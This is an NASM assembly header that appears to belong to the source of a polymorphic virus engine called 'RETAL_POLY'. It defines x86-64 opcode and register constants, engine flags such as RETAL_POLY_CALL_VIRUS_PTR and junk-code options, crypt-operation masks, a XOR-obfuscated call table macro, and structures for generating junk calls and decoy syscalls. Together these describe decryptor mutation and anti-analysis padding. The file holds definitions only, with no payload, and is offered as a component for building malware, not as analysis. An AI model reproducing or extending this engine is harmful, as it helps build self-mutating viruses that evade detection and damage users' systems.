; Byte Regs
%define	_AL	0x00
%define	_CL	0x01
%define	_DL	0x02
%define	_BL	0x03
%define	_AH	0x04
%define	_CH	0x05
%define	_DH	0x06
%define	_BH	0x07

; Word Regs
%define	_AX	0x00
%define	_CX	0x01
%define	_DX	0x02
%define	_BX	0x03
%define	_SP	0x04
%define	_BP	0x05
%define	_SI	0x06
%define	_DI	0x07

; REX Regs
%define	_R8	0x00
%define	_R9	0x01
%define	_R10	0x02
%define	_R11	0x03
%define	_R12	0x04
%define	_R13	0x05
%define	_R14	0x06
%define	_R15	0x07

; Arith Ops
%define	_ADD	0x00
%define	_OR	0x08
%define	_ADC	0x10
%define	_SBB	0x18
%define	_AND	0x20
%define	_SUB	0x28
%define	_XOR	0x30
%define	_CMP	0x38

; ShiftRot Ops
%define	_ROL	0x00
%define	_ROR	0x08
%define	_RCL	0x10
%define	_RCR	0x18
%define	_SHL	0x20
%define	_SHR	0x28
%define	_SAL	0x30
%define	_SAR	0x38

; 0xFE Ops
%define	_INC	0x00
%define	_DEC	0x08
%define	_CALLN	0x10
%define	_JMPN	0x20
%define	_PUSH	0x30

; 0xF6 Ops
%define	_TEST	0x00
%define	_NOT	0x10
%define	_NEG	0x18
%define	_MUL	0x20
%define	_IMUL	0x28
%define	_DIV	0x30
%define	_IDIV	0x38

; 0x0F 0xBA ops
%define	_BT	0x20
%define	_BTS	0x28
%define _BTR	0x30
%define	_BTC	0x38

; Misc Opcode Defines
%define op_mr	0x02
%define sh_cl	0x02

%define _MOV_rm		0x88
%define	_TEST_rm	0x84
%define _XCHG_rm	0x86
%define _LEA_rm		0x8D

; Conditions
%define	_cO	0x0
%define	_cNO	0x1
%define	_cC	0x2
%define	_cNC	0x3
%define	_cZ	0x4
%define	_cNZ	0x5
%define	_cBE	0x6
%define	_cA	0x7
%define	_cS	0x8
%define	_cNS	0x9
%define	_cPE	0xA
%define	_cPO	0xB
%define	_cL	0xC
%define	_cGE	0xD
%define	_cLE	0xE
%define	_cG	0xF

; Poly Engine Flags
%define RETAL_POLY_PTR_INC_MOV		0
%define RETAL_POLY_SRC_INC		1
%define RETAL_POLY_DEST_INC		2
%define RETAL_POLY_MOV_PTR_PTR		3
%define RETAL_POLY_SRC_SET		4
%define	RETAL_POLY_DEST_SET		5
%define	RETAL_POLY_INC			6
%define RETAL_POLY_INVERT_LOOP		7
%define RETAL_POLY_IN_LOOP		8
%define RETAL_POLY_DEST_FIRST		9
%define RETAL_POLY_KEYMOD_FIRST		10
%define RETAL_POLY_RETURN_RIP_E9	11
%define	RETAL_POLY_NO_SYSCALLS		12
%define RETAL_POLY_O_CHECK_REG		13
%define RETAL_POLY_O_SET_REG		14
%define RETAL_POLY_EXE_USE_DEST		15
%define RETAL_POLY_BACKWARDS		16
%define RETAL_POLY_MIX_CRYPT_OPS	17
%define RETAL_POLY_ALWAYS_PUSH_POP	18
%define RETAL_POLY_CALL_VIRUS_PTR	19
%define RETAL_POLY_O_SMALL_JUNK		20
%define RETAL_POLY_EXE_BIG_JUNK		21
%define RETAL_POLY_CALL_USE_DEST	22
%define RETAL_POLY_USE_STACK_JUNK	23
%define RETAL_POLY_STACK_VARS		24
%define RETAL_POLY_STACK_VARS_INIT	25
%define RETAL_POLY_IN_JUNK		26
%define RETAL_POLY_IN_CALL		27
%define RETAL_POLY_NO_JUNK_HEADER	28
%define RETAL_POLY_NO_PUSHF		29

; Crypt Op Type Mask
%define	CRYPT_ADD	0x01
%define	CRYPT_XOR	0x02
%define	CRYPT_ROT	0x04
%define	CRYPT_NOT	0x08

;-[call table defines/macros]-------------------------------------------------
%define CALL_TABLE_XOR	0x7DFB

%macro BEGIN_CALL_TABLE 1
	%define CURRENT_CALL_TABLE %1
	%1:
%endmacro

%macro CALL_TABLE_ITEM 1
	dw ((%1 - CURRENT_CALL_TABLE) & 0xFFFF) ^ CALL_TABLE_XOR
%endmacro

%macro	END_CALL_TABLE 0
	CURRENT_CALL_TABLE %+ _COUNT equ ($ - CURRENT_CALL_TABLE)/2
	%undef CURRENT_CALL_TABLE
%endmacro

;-[JUNK_CALL structure]-------------------------------------------------------
; used to generate junk calls
%define JUNK_SUB_MAX_SIZE	1000	; Max junk subroutine size

struc	JUNK_CALL
	.rel32		resq	1
	.used_regs	resd	1
	.depth		resb	1
	.mem_dx		resw	1
	.mem_write	resb	1
endstruc

;-[JUNK syscall]---------------------------------------------------------------
%define	JUNK_SYSCALL_NONE		0
%define JUNK_SYSCALL_ANY		1
%define	JUNK_SYSCALL_BAD_FD		2
%define JUNK_SYSCALL_BAD_MEM		3
%define JUNK_SYSCALL_RW_SIZE		4
%define JUNK_SYSCALL_CONST		5
%define JUNK_SYSCALL_WHENCE		6
%define JUNK_SYSCALL_BAD_WHENCE		7
%define JUNK_SYSCALL_GOOD_MEM		8
%define	JUNK_SYSCALL_UNALIGNED		9
%define JUNK_SYSCALL_BAD_MEM_ALIGNED	10
%define	JUNK_SYSCALL_SIGNED		11
%define JUNK_SYSCALL_7			12


struc	JUNK_SYSCALL
	._ax		resb	1
	._di		resb	1
	._si		resb	1
	._dx		resb	1
	._r10		resb	1
	._err		resb	1
	.const		resd	1
	.rand_pad	resw	1
	.rda_crc	resd	1
endstruc
